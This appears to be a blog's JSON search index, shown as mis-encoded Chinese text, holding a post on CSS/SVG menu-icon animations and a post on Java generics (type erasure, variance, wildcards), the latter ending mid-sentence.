[{"title":"å›¾æ ‡åŠ¨ç”»çš„å®ç°æ–¹æ³•","url":"/2020/07/14/icon-animation/","content":"\nåœ¨ç»™æˆ‘çš„åšå®¢ä¸»é¢˜åšç§»åŠ¨ç«¯é€‚é…çš„æ—¶å€™ï¼Œèœå•ä¼šéšç€å±å¹•çš„ç¼©å°è€Œéšè—ï¼Œå³ä¸Šè§’çš„æŒ‰é’®ä¼šéšç€èœå•çš„æ‰“å¼€å’Œå…³é—­å±•ç¤ºä¸åŒçš„å›¾æ ‡ã€‚\n\n![åšå®¢å›¾æ ‡](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200802175041.gif)\n\nä½†æ˜¯çªå…€çš„åˆ‡æ¢è®©æˆ‘å¿ƒç”Ÿä¸çˆ½ï¼Œäºæ˜¯å¼€å¯äº†å›¾æ ‡åˆ‡æ¢åŠ¨ç”»çš„æ¢å¯»ä¹‹è·¯ã€‚ç»å†ä¸€ç•ªæœå¯»ï¼Œæ€»ç»“å‡ºä¸‹é¢å‡ ç§å›¾æ ‡å˜æ¢çš„å®ç°æ–¹å¼ã€‚\n\n## åˆ‡æ¢åŠ¨ç”»\n\n![åˆ‡æ¢åŠ¨ç”»](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200802180139.gif)\n\nç®€å•çš„åˆ‡æ¢åŠ¨ç”»å¹¶ä¸æ¶‰åŠä»€ä¹ˆå¤æ‚çš„å›¾æ ‡å˜åŒ–ï¼ŒåŸç†å°±æ˜¯äº‹å…ˆå‡†å¤‡å¥½ä¸¤ä¸ªå›¾æ ‡ï¼ŒæŠŠä»–ä»¬é‡å åœ¨åŒä¸€ä¸ªä½ç½®ï¼Œæ¯æ¬¡åªæ˜¾ç¤ºå…¶ä¸­ä¸€ä¸ªï¼Œåˆ‡æ¢çš„æ—¶å€™é€šè¿‡è°ƒæ•´ `opacity` å’Œ `â€œsizeâ€` æ¥è¾¾åˆ°ä¸€ç§åŠ¨æ€åˆ‡æ¢çš„æ•ˆæœã€‚ä¸‹é¢çœ‹æ…¢æ”¾æ˜¯æ€ä¹ˆå›äº‹ã€‚\n\n![æ…¢æ”¾åˆ‡æ¢åŠ¨ç”»](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200802175611.gif)\n\nå¼„æ¸…æ¥šåŸç†ä¹‹åç›´æ¥å¼€å§‹ç ï¼Œä¸‹é¢æ˜¯ç®€å•çš„ HTMLï¼Œä¸¤ä¸ª icon å’Œä¸€ä¸ª `container` è¶³çŸ£ã€‚\n\n```html\n<div class=\"container\">\n  <img src=\"./assets/menu.svg\" class=\"icon icon-menu\">\n  <img src=\"./assets/close.svg\" class=\"icon icon-close\">\n</div>\n```\n\nç»™ `container` æ·»åŠ ç‚¹å‡»äº‹ä»¶ï¼Œç‚¹å‡»åˆ‡æ¢æ·»åŠ  `close` ç±»ã€‚\n\n```javascript\nwindow.onload = function () {\n    document.querySelector('.container').addEventListener('click', function (event) {\n        this.classList.toggle('close');\n    });\n}\n```\n\næ¥ä¸‹æ¥å°±æ˜¯ CSSï¼Œ`container` ä¸‹é»˜è®¤æ˜¾ç¤ºèœå•å›¾æ ‡ï¼Œæ·»åŠ  `close` ç±»åéšè—èœå•å›¾æ ‡å¹¶æ˜¾ç¤ºå…³é—­å›¾æ ‡ã€‚\n\n```css\n.container {\n    width: 96px;\n    height: 96px;\n    border-radius: 4px;\n    position: relative;\n    cursor: pointer;\n}\n\n.container > .icon {\n    width: 72px;\n    height: 72px;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    transition: all .3s ease-in-out;\n}\n\n.container > .icon-menu,\n.container.close > .icon-close { \n    opacity: 1; transform: translate(-50%, -50%) scale(1);\n}\n.container > .icon-close,\n.container.close > .icon-menu { \n    opacity: 0; transform: translate(-50%, -50%) scale(0);\n}\n\n```\n\nè¿™é‡Œæœ‰å‡ ç‚¹å€¼å¾—ä¸€æ\n\n- å› ä¸ºä¸¤ä¸ªå›¾æ ‡è¦é‡å ï¼Œæ‰€ä»¥ä½¿ç”¨ç»å¯¹å®šä½å’Œå’Œ `transform` çš„æ–¹å¼å±…ä¸­\n- å›¾æ ‡çš„ `transform` å±æ€§ä¸­ `translate` å’Œ `scale` çš„é¡ºåºä¸èƒ½æ”¹å˜ï¼Œå¦‚æœ `scale` åœ¨å‰å°±ä¼šå‡ºç°ä¸‹é¢çš„é—®é¢˜\n\n![åˆ‡æ¢å¼‚å¸¸](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200802203716.gif)\n\n- å…·ä½“åˆ‡æ¢æ•ˆæœå¯ä»¥è‡ªå·±å®šä¹‰ï¼Œä¾‹å¦‚æŠŠ `scale` æ¢æˆ `rotate(-180deg)` å’Œ `rotate(180deg)` å°±æ˜¯ä¸‹é¢çš„æ•ˆæœ\n\n![æ—‹è½¬åˆ‡æ¢](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804102512.gif)\n\n### ä¸€ç‚¹å°æ”¹è¿›\n\nä¾‹å­ä¸­å›¾æ ‡åˆ‡æ¢åªæœ‰ä¸¤ä¸ªçŠ¶æ€ï¼šæ˜¾ç¤ºèœå•å’Œæ˜¾ç¤ºå…³é—­ï¼Œå•ç‹¬ç”¨ JavaScript æ·»åŠ ç‚¹å‡»äº‹ä»¶åŠ¨æ€æ·»åŠ  CSS ç±»æ„Ÿè§‰æœ‰ç‚¹æ²¡å¿…è¦ã€‚å¯ä»¥è€ƒè™‘é€šè¿‡ `checkbox` åªç”¨ HTML å’Œ CSS å®ç°ç›¸åŒçš„æ•ˆæœã€‚\n\n```html\n<div class=\"container\">\n    <input class=\"checkbox\" id=\"toggle\" type=\"checkbox\">\n    <label class=\"label\" for=\"toggle\">\n        <img src=\"./assets/menu.svg\" class=\"icon icon-menu\">\n        <img src=\"./assets/close.svg\" class=\"icon icon-close\">\n    </label>\n</div>\n```\n\nå®ç°çš„åŸç†æ˜¯å°†ä¸¤ä¸ªå›¾æ ‡æ”¾ç½®åœ¨ `label` ä¸­ï¼Œå†æŠŠ `label` å’Œ `checkbox` ç»‘å®šï¼Œç„¶åé€šè¿‡ CSS éšè— `checkbox`ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ `checkbox:checked` æ¥åˆ¤æ–­åˆ‡æ¢çŠ¶æ€è€Œä¸ç”¨å•ç‹¬æ³¨å†Œç‚¹å‡»äº‹ä»¶ï¼Œç›¸å…³çš„å¼€å…³å¼€åˆé€»è¾‘å¯ä»¥æ³¨å†Œæ”¾åœ¨ `checkbox` çš„ `change` äº‹ä»¶ä¸­ï¼Œä»£ç æ˜¯ä¸æ˜¯æœ‰ç‚¹é€»è¾‘å’Œæ˜¾ç¤ºåˆ†ç¦»çš„æ„Ÿè§‰äº†ğŸ˜„ã€‚\n\n```css\n.container {\n    width: 96px;\n    height: 96px;\n}\n.checkbox {\n    display: none;\n}\n.label {\n    display: block;\n    width: 100%;\n    height: 100%;\n    position: relative;\n    cursor: pointer;\n}\n.icon {\n    width: 72px;\n    height: 72px;\n    position: absolute;\n    left: 50%;\n    top: 50%;\n}\n.label > .icon-close,\n#toggle:checked ~ label > .icon-menu {\n    opacity: 0;\n    transform: translate(-50%, -50%) scale(0);\n    transition: all .3s;\n}\n.label > .icon-menu,\n#toggle:checked ~ label > .icon-close {\n    opacity: 1;\n    transform: translate(-50%, -50%) scale(1);\n    transition: all .3s;\n}\n```\n\n## æ¨¡æ‹ŸåŠ¨ç”»\n\n![æ¨¡æ‹ŸåŠ¨ç”»](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804105014.gif)\n\nè¿™ä¸ªæ¨¡æ‹ŸåŠ¨ç”»çš„ä¾‹å­å¯èƒ½ä¼šæ„Ÿè§‰å’Œä¸Šé¢çš„åˆ‡æ¢åŠ¨ç”»æœ‰ç‚¹åƒï¼Œå…¶å®å¹¶ä¸å¤ªä¸€æ ·ã€‚åˆ‡æ¢åŠ¨ç”»æ˜¯é€šè¿‡ `opacity` çš„äº¤æ›¿åŠ ä¸Šä¸€äº›æ•ˆæœï¼ˆå¦‚æ—‹è½¬ï¼Œç¼©æ”¾ç­‰ï¼‰æ¥å®ç°å›¾æ ‡åˆ‡æ¢ã€‚è€Œæ¨¡æ‹ŸåŠ¨ç”»ï¼Œç›´æ¥æ¥çœ‹æ…¢æ”¾ã€‚\n\n![æ…¢æ”¾æ¨¡æ‹ŸåŠ¨ç”»](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804105438.gif)\n\nå¯ä»¥çœ‹åˆ°ï¼Œæ¨¡æ‹ŸåŠ¨ç”»ï¼ˆmorphing transitionï¼‰æ˜¯ä»å›¾æ ‡çš„ç»†èŠ‚å®ç°çš„çš„ã€‚è¦åšä¸€ä¸ªæ¨¡æ‹ŸåŠ¨ç”»ï¼Œä¸€èˆ¬æ¥è®²å°†å˜æ¢å‰çš„å›¾æ ‡å’Œå˜æ¢åçš„å›¾æ ‡åˆ†æˆå¯¹åº”çš„éƒ¨åˆ†ï¼Œè®¾è®¡å¥½å›¾æ ‡çš„å„ä¸ªéƒ¨åˆ†æ˜¯å¦‚ä½•ç»è¿‡ä¸€ç³»åˆ—çš„å˜åŒ–æœ€åæ„æˆæ–°å›¾æ ‡åå°±å¯ä»¥å¼€å§‹å†™äº†ã€‚ä¸åƒåˆ‡æ¢åŠ¨ç”»ç›´æ¥æ‹¿å›¾æ ‡æ¥ç”¨ï¼Œè¿™é‡Œæ˜¯è¦æ‰‹åŠ¨å†™å›¾æ ‡çš„ã€‚æ‰€ä»¥å¯¹äºä¸€äº›è¿‡äºå¤æ‚çš„å›¾æ ‡ï¼Œè¿™ç§æ–¹æ³•ä¸æ˜¯å¾ˆé€‚ç”¨ã€‚æ¥ä¸‹æ¥çœ‹ä»£ç \n\n```html\n<div class=\"container\">\n    <input class=\"nav-checkbox\" id=\"toggle\" type=\"checkbox\">\n    <label class=\"nav-label\" for=\"toggle\">\n        <i class=\"icon icon-menu\"></i>\n    </label>\n</div>\n```\n\næ¥ç€ç”¨ `checkbox` å†™ï¼Œåœ¨ `label` ä¸­æ·»åŠ  `i` æ ‡ç­¾ï¼Œæˆ‘ä»¬æ‰“ç®—ç”¨ `::before` å’Œ `::after` ä¼ªå…ƒç´ æ¥æ„æˆé»˜è®¤èœå•çš„ä¸‰æ¡æ ã€‚\n\n```css\n.container {\n    width: 96px;\n    height: 96px;\n    \n    border-radius: 4px;\n    overflow: hidden;\n}\n.checkbox {\n    display: none;\n}\n.label {\n    width: 96px;\n    height: 96px;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    cursor: pointer;\n}\n.icon-menu,\n.icon-menu::before,\n.icon-menu::after {\n    width: 72px;\n    height: 12px;\n    background-color: black;\n    display: block;\n    transition: all 3s;\n}\n.icon-menu {\n    position: relative;\n}\n.icon-menu::before,\n.icon-menu::after {\n    position: absolute;\n    content: '';\n}\n.icon-menu::before {\n    top: -24px;\n}\n.icon-menu::after {\n    top: 24px;\n}\n```\n\nåˆ°è¿™é‡Œä¸ºæ­¢ï¼Œä¸€ä¸ª `menu` å›¾æ ‡å°±ç”¨ HTML å’Œ CSS çš„æ–¹å¼å†™å‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥åŠ åŠ¨ç”»ã€‚\n\n```css\n#toggle:checked ~ label .icon-menu {\n    transform: rotate(225deg);\n}\n#toggle:checked ~ label .icon-menu::before {\n    top: 0;\n    transform: rotate(90deg);\n}\n#toggle:checked ~ label .icon-menu::after {\n    top: 0;\n}\n```\n\nä»£ç åªæœ‰å‡ è¡Œï¼Œå› ä¸ºæˆ‘ä»¬è¦å†™çš„å˜æ¢æ¯”è¾ƒç®€å•ï¼Œç¬¬ä¸€æ¡æ é¡ºæ—¶é’ˆ 45 åº¦ï¼Œç¬¬äºŒä¸‰æ¡æ é€†æ—¶é’ˆ 45 åº¦æ—‹è½¬æ„æˆä¸€ä¸ª X å›¾æ ‡ï¼Œç„¶åè°ƒæ•´æ—‹è½¬çš„åœˆæ•°è®©åŠ¨ç”»çœ‹èµ·æ¥å¤æ‚ä¸€äº›ï¼Œæœ€åé€‰æ‹©çš„æ˜¯ 225 å’Œ 90ï¼Œçœ‹èµ·æ¥è¿˜æ¯”è¾ƒèˆ’æœã€‚\n\næ¨¡æ‹ŸåŠ¨ç”»çš„å®ç°æ–¹å¼ä¹Ÿæœ‰å¾ˆå¤šï¼Œè¿™é‡Œæˆ‘é€‰æ‹©ç”¨ä¼ªå…ƒç´ æ±‚ç®€å•åè€Œå¯¼è‡´èƒ½å®ç°çš„æ•ˆæœå—åˆ°äº†é™åˆ¶ï¼ˆæƒ³å®ç°ä¸­é—´é‚£æ¡æ æ…¢æ…¢å˜çŸ­ï¼Œä½†æ˜¯å› ä¸ºè¿™é‡Œä¼ªå…ƒç´ çš„ç»å¯¹å®šä½æ²¡åŠæ³•ç¼©æ”¾ï¼‰ã€‚ç”¨ä¸‰ä¸ª `span` æ ‡ç­¾çš„å¯èƒ½ä¼šæ›´å¥½ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªåˆ«äººå†™çš„ [Material Morphing Icons](https://codepen.io/albebonv/full/gIlrw)ï¼Œç„¶åå†æ¨èä¸€ä¸ªæ¯”è¾ƒæœ‰åçš„åº“ [hamburgers](https://github.com/jonsuh/hamburgers)ã€‚\n\n![](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804111851.gif)\n\n\n\n## SVG åŠ¨ç”»\n\n![SVGåŠ¨ç”»](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804112649.gif)\n\nè¯´åˆ°å›¾æ ‡åŠ¨ç”»åº”è¯¥æ˜¯ç»•ä¸å¼€ SVG çš„ï¼ŒåŸç†æ˜¯å’Œæ¨¡æ‹ŸåŠ¨ç”»ç±»ä¼¼ï¼Œä½†æ˜¯ SVG æ›´åŠ çµæ´»å®¹æ˜“æ“ä½œï¼Œè€Œä¸”ä¹Ÿå¯ä»¥åº”ä»˜å¤æ‚çš„å›¾æ ‡å’ŒåŠ¨ç”»ã€‚ä¸€æ ·æ…¢åŠ¨ä½œå›æ”¾çœ‹æ•ˆæœã€‚\n\n![æ…¢æ”¾SVG](https://blog-pics-1302502188.cos.ap-shanghai.myqcloud.com/20200804113048.gif)\n\nä¸­é—´ç¼©çŸ­æ¶ˆå¤±ï¼Œç„¶åä¸Šä¸‹æ—‹è½¬ç»„æˆ Xã€‚è¿™é‡Œæˆ‘ç”¨çš„ `snapsvg` å†™çš„ã€‚é¦–å…ˆåœ¨ HTML æ–‡ä»¶ä¸­æ’å…¥ `snap.js`ã€‚\n\n```html\n<script src=\"./snap.svg-min.js\"></script>\n```\n\nå¼€å§‹å†™å›¾æ ‡\n\n```js\nvar container = Snap(96, 96);\nvar rectTop = container.rect(12, 20, 72, 10);\nvar rectMed = container.rect(12, 42, 72, 10);\nvar rectBot = container.rect(12, 64, 72, 10);\n```\n\nç„¶åæ˜¯åŠ¨ç”»ã€‚\n\n```javascript\nvar closeState = false;\ncontainer.click(function () {\n    if (closeState) { // é»˜è®¤ menu\n        rectTop.animate({\n            transform: null\n        }, 300, mina.easeinout);\n        rectMed.animate({\n            transform: null\n        }, 300, mina.easeinout);\n        rectBot.animate({\n            transform: null\n        }, 300, mina.easeinout);\n    } else {\n        rectTop.animate({ // ç¬¬ä¸€æ¡æ ä½ç§»åˆ°ä¸­é—´åŒæ—¶æ—‹è½¬45åº¦ï¼ˆç›¸å¯¹è‡ªèº«ä¸­å¿ƒç‚¹æ—‹è½¬ï¼‰\n            transform: 't0, 22 r45 ' + rectTop.getBBox().cx +\n            ' ' + rectTop.getBBox(0).cy\n        }, 300, mina.easeinout);\n        rectMed.animate({ // ä¸­é—´çš„æ é•¿åº¦ç¼©å°æ¶ˆå¤±\n            transform: 's0, 1'\n        }, 300, mina.easeinout);\n        rectBot.animate({ // ç¬¬ä¸‰æ¡æ ä½ç§»åˆ°ä¸­é—´åŒæ—¶æ—‹è½¬-45åº¦ï¼ˆç›¸å¯¹è‡ªèº«ä¸­å¿ƒç‚¹æ—‹è½¬ï¼‰\n            transform: 't0, -22 r-45 ' + rectBot.getBBox().cx +\n            ' ' + rectBot.getBBox(0).cy\n        }, 300, mina.easeinout);\n    }\n    closeState = !closeState; // æ›´æ–° closeState\n});\n```\n\n`snapsvg` åªæ˜¯ç²—ç•¥ç ”ç©¶äº†ä¸€ä¼šæ–‡æ¡£å°±å¼€å§‹å†™äº†ï¼Œè¿™é‡Œçš„åŠ¨ç”»å®ç°åº”è¯¥æœ‰æ›´ç®€ä¾¿çš„æ–¹æ³•ï¼Œæœ‰æ—¶é—´å†å¦å¤–æ¢ç©¶ã€‚\n\næ„Ÿè°¢é˜…è¯»","tags":["CSS"]},{"title":"Java æ³›å‹æ·±å…¥","url":"/2020/07/05/java-generic-types/","content":"\n\næœ¬ç‰‡æ–‡ç« é¢å‘åƒæˆ‘ä¸€æ ·ï¼Œå·²ç»åŸºæœ¬äº†è§£æ³›å‹ï¼ŒçŸ¥é“å¦‚ä½•ä½¿ç”¨æ³›å‹ç±»æˆ–è€…æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ä¸€äº›ç»†èŠ‚ä¸Šæœ‰ç‚¹æ¨¡æ£±ä¸¤å¯ï¼Œå¶å°”éœ€è¦åœ¨ IDE çš„å¸®åŠ©ä¸‹æ‰èƒ½å†™å‡ºæ­£ç¡®çš„ä»£ç çš„æœ‹å‹ã€‚çœ‹å¼€ç¯‡çš„æ€è€ƒé¢˜ï¼Œå¦‚æœä½ å¾ˆæ¸…æ¥šçŸ¥é“ç­”æ¡ˆï¼ˆåœ¨æœ€åä¸€èŠ‚ï¼‰ï¼Œå°±ä¸ç”¨è´¹æ—¶é—´è¯»ä¸‹å»äº†ã€‚\n\n## æ€è€ƒé¢˜\n\n1. è€ƒè™‘ä¸€ä¸ªåä¸º `Shape` çš„ç±»æœ‰ `Oval` å’Œ `Rectangle` ä¸¤ä¸ªå­ç±»ï¼Œè¯·é—®ä¸‹åˆ— Java ä»£ç ï¼Œå“ªå‡ è¡Œä¸èƒ½æ­£ç¡®ç¼–è¯‘ï¼Ÿ\n\n   ```java\n   // 1\n   Collection<Object> shapes = new ArrayList<Shape>();\n   // 2\n   Collection<Shape> shapes = new ArrayList<Shape>();\n   // 3\n   Collection<?> shapes = new ArrayList<Oval>();\n   // 4\n   Collection<Shape> shapes = new ArrayList<Oval>();\n   // 5\n   Collection<Shape> = new ArrayList<? extends Shape>();\n   // 6\n   List<Shape> shapes = new ArrayList<Oval>();\n   // 7\n   List<? extends Shape> shapes = new ArrayList<Oval>();\n   // 8\n   Object[] shapes = new ArrayList<Shape>[];\n   // 9\n   ArrayList<Shape>[] shapes = new ArrayList<Shape>[];\n   // 10\n   ArrayList<Shape> shapes = new ArrayList<Oval>();\n   // 11\n   ArrayList<? super Shape> shapes = new ArrayList<Object>();\n   ```\n\n2. ç»™å‡ºæ’åºæ¥å£ï¼Œ\n\n   ```java\n   import java.util.List;\n   \n   public interface Sort<T extends Comparable<T>> {\n       List<T> sort(List<T> ts);\n   }\n   ```\n\n   ä»¥ä¸‹å¿«é€Ÿæ’åºçš„ç±»ç­¾åå“ªä¸ªæ˜¯æ­£ç¡®çš„(ä¸è€ƒè™‘å®ç°)\n\n   ```java\n   import java.util.List;\n   // 1\n   public class QuickSort<T> implements Sort<T>\n   // 2\n   public class QuickSort<T> implements Sort<T extends Comparable<T>>\n   // 3\n   public class QuickSort<T extends Comparable<T>> implements Sort<T>\n   // 4\n   public class QuickSort<T extends Comparable<T>> implements Sort<T extends Comparable<T>>\n   ```\n\nè¦è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘å°†ä»ä»¥ä¸‹ä¸¤èŠ‚æ·±å…¥ç†è§£ Java æ³›å‹ã€‚\n\n## ç±»å‹æ“¦é™¤(Type Erasure)\n\nJava ä¸­çš„æ³›å‹æ˜¯é€šè¿‡ä¸€ç§å« Type Erasure çš„æ–¹å¼å®ç°çš„ã€‚ç¼–è¯‘å™¨åœ¨ç¼–è¯‘å®Œä»£ç æ“¦é™¤äº†æ³›å‹ï¼Œå› æ­¤åœ¨è¿è¡Œæ—¶ (runtime) æ³›å‹æ˜¯ä¸å¯è§çš„ã€‚è¿™ç§æ–¹æ³•ä½¿å¾—å¸¦æœ‰æ³›å‹çš„ä»£ç èƒ½å¤Ÿå‘åå…¼å®¹ JDK 1.5 ä¹‹å‰çš„åŸç”Ÿç±»å‹(raw types)ã€‚ä¸‹é¢é€šè¿‡ä¸¤ä¸ªä¾‹å­æ¥çœ‹çœ‹ç±»å‹æ“¦é™¤æ˜¯æ€ä¹ˆåšçš„ï¼Œ\n\n### æ“¦é™¤æ— ç•Œç±»å‹\n\nå¯¹ä»¥ä¸‹æ— ç•Œæ³›å‹ç±»ï¼Œ\n\n```java\npublic class Data<T> {\n  private T data;\n  \n  public void setData(T data) {\n    this.data = data;\n  }\n  \n  public T getData() {\n    return this.data;\n  }\n  \n  public static void main(String[] args) {\n    Data<String> data = new Data<>();\n    data.setData(\"Hello\");\n    String s = data.getData();\n  }\n}\n```\n\næ“¦é™¤æ³›å‹åè™šæ‹Ÿæœºæ‰§è¡Œçš„ä»£ç å¦‚ä¸‹æ‰€ç¤º\n\n```java\npublic class Data {\n  private Object data;\n  \n  public void setData(Object data) {\n    this.data = data;\n  }\n  \n  public Object getData() {\n    return this.data;\n  }\n  \n  public static void main(String[] args) {\n    Data data = new Data();\n    data.setData(\"Hello\");\n    String s = (String) data.getData();\n  }\n}\n```\n\nå¯ä»¥å‘ç°å¯¹æ— ç•Œç±»å‹\n\n- ç¼–è¯‘å™¨ä¼šæŠŠæ³›å‹æ›¿æ¢æˆ `Object` \n- éœ€è¦è½¬å‹çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨ä¼šæ ¹æ® T çš„ç±»å‹æ·»åŠ å¼ºåˆ¶ç±»å‹è½¬æ¢\n\n### æ“¦é™¤æœ‰ç•Œç±»å‹\n\nå¯¹ä»¥ä¸‹æœ‰ç•Œæ³›å‹æ–¹æ³•ï¼Œ\n\n```java\npublic static <E extends GeometricObject> boolean equalArea(E o1, E o2) {\n  return o1.getArea() == o2.getArea();\n}\n```\n\næ“¦é™¤æ³›å‹åè™šæ‹Ÿæœºæ‰§è¡Œçš„ä»£ç å¦‚ä¸‹æ‰€ç¤º\n\n```java\npublic static boolean equalArea(GeometricObject o1, GeometricObject o2) {\n\treturn o1.getArea() == o2.getArea();\n}\n```\n\nå¦‚æœæ³›å‹æ˜¯æœ‰ç•Œçš„ï¼Œç¼–è¯‘å™¨åˆ™ä¼šå°†å…¶æ›¿æ¢æˆæœ‰ç•Œçš„ç±»å‹ã€‚\n\n### æ“¦é™¤å±€é™\n\nç±»å‹æ“¦é™¤å¤±å»äº†åœ¨æ³›å‹ä»£ç ä¸­æ‰§è¡Œç‰¹å®šæ“ä½œçš„èƒ½åŠ›ï¼Œä»»ä½•åœ¨è¿è¡Œæ—¶éœ€è¦çŸ¥é“å…·ä½“ç±»å‹çš„ä»£ç æ— æ³•æ­£å¸¸å·¥ä½œã€‚\n\n* **ä¸èƒ½ new T ç±»å‹çš„å¯¹è±¡**\n\n  å› ä¸ºæ²¡æœ‰åŠæ³•ç¡®å®š T ç±»å‹æ˜¯åŒ…å«æœ‰æ— å‚çš„æ„é€ å‡½æ•°\n\n* **ä¸èƒ½åˆ›å»ºæ³›å‹æ•°ç»„[ ]**\n\n  Java ä¸­æ•°ç»„æ”¯æŒåå˜ï¼Œæ³›å‹æ˜¯ä¸å˜çš„ï¼Œè§åã€‚\n\n* **æ³›å‹ä¸èƒ½æ˜¯é™æ€æˆå‘˜**\n\n  é™æ€å±æ€§åªè·Ÿéšç±»å­˜åœ¨ä¸€ä»½ï¼Œå¦‚æœå…è®¸é™æ€å±æ€§æ˜¯æ³›å‹å‚æ•°ç±»å‹ï¼Œåˆ™å¯¹ä¸åŒçš„å®ä¾‹åŒ–ä¼šäº§ç”Ÿæ­§ä¹‰\n\n* **ä¸èƒ½å¯¹æ³›å‹å‚æ•°ç±»å‹è½¬æ¢æˆ–è€… instanceof**\n\n* **ä¸èƒ½é€šè¿‡ä¸åŒçš„æ³›å‹ç±»å‹é‡è½½æ–¹æ³•**\n\n  ```java\n  public void print(Set<String> set) { ... }\n  public void print(Set<Integer> set) { ... }\n  ```\n\n* **è‡ªå®šä¹‰å¼‚å¸¸ä¸èƒ½å¸¦æ³›å‹å‚æ•°**\n\n  ```java\n  try {\n    doSomething();\n  } catch (MyExp<Integer> e) {\n    doA();\n  } catch (MyExp<String> e2) {\n    doB()\n  } \n  // å› ä¸ºç±»å‹æ“¦é™¤ï¼Œæ‰€ä»¥ MyExp<Integer> å’Œ MyExp<String> éƒ½æ˜¯ MyExpï¼Œ\n  // æ— æ³•åˆ¤æ–­æœ€åå»äº†å“ªä¸€ä¸ª catch åˆ†æ”¯\n  ```\n\n## é€†å˜ä¸åå˜\n\nç¼–ç¨‹è¯­è¨€ä¸­åå˜å’Œé€†å˜ç”¨æ¥æè¿°ç±»å‹è½¬æ¢åçš„ç»§æ‰¿å…³ç³»ï¼Œå®šä¹‰ä¸ºï¼šå¦‚æœ $A$ï¼Œ$B$ è¡¨ç¤ºç±»å‹ï¼Œ$f(\\cdot)$ è¡¨ç¤ºç±»å‹è½¬æ¢ï¼Œ$\\leq$ è¡¨ç¤ºç»§æ‰¿å…³ç³»\n\n- å½“ $A \\leq B$ æ—¶æœ‰ $f(B) \\leq f(A)$ æˆç«‹ï¼Œåˆ™ $f(\\cdot)$ æ˜¯é€†å˜ (contravariant) çš„ï¼›\n- å½“ $A \\leq B$ æ—¶æœ‰ $f(A) \\leq f(B)$ æˆç«‹ï¼Œåˆ™ $f(\\cdot)$ æ˜¯åå˜ (covariant) çš„ï¼›\n- å½“ $A \\leq B$ æ—¶ï¼Œ$f(A)$ å’Œ $f(B)$ æ— å…³ï¼Œåˆ™ $f(\\cdot)$ æ˜¯ä¸å˜ (invariant) çš„ï¼›\n\nåœ¨ Java ä¸­ï¼Œæ³›å‹**æœ¬èº«**æ˜¯ä¸å˜çš„ã€‚`Integer` æ˜¯ `Number` çš„å­ç±»ï¼Œä½†æ˜¯ `ArrayList<Integer>` å’Œ `ArrayList<Number>` æ²¡æœ‰ä»»ä½•å…³ç³»ã€‚ä¹Ÿå³ `ArrayList<Number> list = new ArrayList<Integer>()` ä¸èƒ½æ­£ç¡®é€šè¿‡ç¼–è¯‘ã€‚è¿™é‡Œæˆ‘æƒ³å¼•ç”¨ Thinking in Java ä¸­çš„åŸè¯\n\n>  A **List** of **Apple** is not a **List of Fruit**. A **List** of **Apple** will hold **Apples** and subtypes of **Apple**, and a **List of Fruit** will hold any kind of **Fruit**. Yes, including **Apples**, but that doesnâ€™t make it a **List of Apple;** [^Thinking-in-Java]\n>\n> ä¸€ç¯®è‹¹æœä¸æ˜¯ä¸€ç¯®æ°´æœã€‚ä¸€ç¯®è‹¹æœè£…ç€è‹¹æœå’Œå®ƒçš„äºšç§ï¼Œè€Œä¸€ç¯®æ°´æœè£…ç€å„ç§æ°´æœï¼Œæ°´æœçš„ç¡®åŒ…å«è‹¹æœï¼Œä½†å¹¶ä¸ä»£è¡¨å®ƒå°±æ˜¯ä¸€ç¯®è‹¹æœã€‚\n\nçœ‹ä¸ªå…·ä½“çš„ä¾‹å­å§ï¼Œè€ƒè™‘ä»¥ä¸‹ä»£ç ï¼š\n\n```java\nArrayList<Integer> integers = new ArrayList<Integer>();\nintegers.add(new Integer(6));\nArrayList<Number> numbers = integers; // å‡å¦‚å¯ä»¥å‘ä¸Šè½¬å‹\nnumbers.add(new Float(6.6));\nInteger n = integers.get(1); // ClassCastException\n```\n\nå‡è®¾ç¬¬ä¸‰è¡Œä»£ç æ˜¯æˆç«‹çš„ï¼Œå°±æœ‰å¯èƒ½äº§ç”Ÿåƒæœ€åä¸€è¡Œè¿™æ ·é”™è¯¯çš„ä»£ç ã€‚å®é™…ä¸Šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ç¬¬ä¸‰è¡Œå°±å°±ç›´æ¥æŠ¥é”™äº† `Type mismatch: cannot convert from ArrayList<Integer> to ArrayList<Number>` ã€‚\n\n### æ³›å‹é€šé…ç¬¦\n\nè¯•ç€å†™ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒæ”¯æŒæ‰“å°ç±»å‹ä¸º `Integer`ã€`Long`ã€`Byte`ã€`Double`ã€`Float` æˆ–è€… `Short` çš„æ•°ç»„ã€‚è¿™æ—¶ä½ å°±ä¼šå‘ç°ï¼Œæ–¹æ³•å‚æ•°ä¼ å…¥ `List<Number>` æ²¡æœ‰åŠæ³•å‘ä¸‹è½¬å‹ä¸º `List<Subtype of Number>`ï¼Œæ€»å¾—æœ‰ä¸ªæ–¹æ³•æ¥åšç±»ä¼¼çš„äº‹æƒ…ï¼Œäºæ˜¯ä¸ºäº†ä½¿æ³›å‹å…·æœ‰åå˜æˆ–è€…é€†å˜æ€§ï¼Œæ³›å‹é€šé…ç¬¦å‡ºç°äº†ã€‚\n\n```java\npublic static void print(List<? extends Number> list) {\n  for (int i = 0; i < list.size(); i++) {\n    System.out.println(list.get(i));\n  }\n}\n```\n\n### extends å’Œåå˜\n\nå½“æˆ‘ä»¬çœ‹è§ `<? extends Number>` æ—¶ï¼Œæˆ‘ä»¬ä¸èƒ½æŠŠå®ƒå½“æˆæ˜¯ç»§æ‰¿è‡ª `Number` çš„ä»»ä½•ç±»å‹ã€‚å› ä¸ºå®ƒå¹¶ä¸æ„å‘³ç€ `List<? extends 